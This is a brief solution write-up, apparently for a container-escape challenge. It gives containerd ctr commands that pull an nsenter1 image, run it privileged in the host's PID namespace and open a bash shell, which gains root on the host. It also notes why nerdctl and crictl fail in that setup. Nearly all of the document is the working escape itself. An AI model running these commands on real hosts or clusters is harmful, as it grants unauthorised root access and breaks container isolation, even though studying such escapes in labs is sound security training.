# Solution

## Ctr CLI

```bash
ctr i pull r.jpts.uk/nsenter1:latest
ctr run -d --rm --privileged --with-ns pid:/proc/1/ns/pid r.jpts.uk/nsenter1:latest r00t
ctr t exec -t --exec-id x r00t bash
```

## Non-Solutions

* Nerdctl doesn't work as we don't mount in the necessary dirs
* crictl doesn't work due to CNI incompatibiity with calico - [explanation](https://github.com/containerd/cri/issues/520#issuecomment-355362760)
